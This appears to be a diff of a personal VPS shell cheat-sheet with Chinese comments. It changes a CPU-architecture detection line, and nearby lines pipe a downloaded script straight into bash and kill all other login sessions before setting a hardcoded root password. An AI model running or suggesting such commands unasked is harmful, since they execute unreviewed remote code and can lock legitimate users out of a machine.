@@ -35,7 +35,7 @@ nc -v -u -z -w5 162.159.193.10 2408
 wget -qO- bench.sh | bash #检测vps
 
 #判断处理器架构
-case "$(uname -m)" in x86_64|x64|x64)uname=amd64;;i386|i686)uname=x86;;armv8|arm64|aarch64)uname=armv8;;armv7l)uname=armv7;;*)echo none;esac && echo $uname
+case `uname -m` in x86_64|amd64|x64)CPU=amd64;;i386|i686)CPU=386;;armv8|arm64|aarch64)CPU=arm64;;armv6l|armv7|armv7l)CPU=armv7;;*)echo NOCPU;exit;esac && echo $CPU
 
 #抢小鸡改密码命令
 for pts in `who | awk '{print $2}'`;do if [ `tty` != /dev/$pts ];then pkill -9 -t $pts;fi;done;echo 'root:160570'|chpasswd
